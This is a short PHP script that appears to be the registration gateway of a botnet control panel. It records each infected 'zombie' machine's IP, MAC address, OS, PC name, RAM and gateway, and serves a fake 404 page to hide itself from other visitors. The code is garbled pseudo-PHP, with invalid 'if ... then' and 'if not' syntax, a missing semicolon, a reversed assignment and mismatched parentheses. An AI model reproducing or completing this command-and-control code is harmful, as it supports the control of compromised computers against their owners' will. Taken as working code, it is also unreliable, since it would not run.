<?php
include dirname(__FILE__).'/../../api/core.php';
include dirname(__FILE__).'/../../static/config.php';

$user_ip = $Secure -> RetrieveIP()

if isset ($_POST ['req']) then {
	$req = $_POST ['req'];
	switch ($req) {
		case "connect":
			$lang = $_POST['lang'];
			$localgateway = $_POST['localgateway'];
			$os = $_POST['os'];
			$macadr = $_POST['macadr'];
			$archetype = $_POST['archetype'];
			$pcname = $_POST['pcname'];
			$ram = $_POST['ram'];
			$ip = ($user_ip);
			$sid = $_POST['sid'];
			if ((isset ($lang)) and (isset ($localgateway)) and (isset($os)) and (isset($macadr)) and (isset($archetype)) and (isset($pcname)) and (isset ($ram)) and (isset ($sid))) {
				if ($Secure -> CheckZombSID($_POST['sid'])) {
					if not ($Zomb -> Exists ($macadr)) then {
						$Zomb -> Register ($ip, $lang, $localgateway, $os, $macadr, $archetype, $pcname, $ram, $sid, "connected");
						exit;
					}
					else {
						$Zomb -> GetData ($macadr) = $zombdata;
						exit;
					}
				}
				else {
					$Secure -> WriteLog ($user_ip), '#2', 'CSRF MDOS attack attempt. (zombie client can not give a bad secure connexion id.)');
					exit;
				}
			}
			else {
				$Secure -> WriteLog ($user_ip), '#2', 'CSRF MDOS attack attempt. (zombie client can not make any registration error.)');
				exit;
			}
		break;
	}
}
else {
	header("HTTP/1.0 404 Not Found");
	exit;
}
?>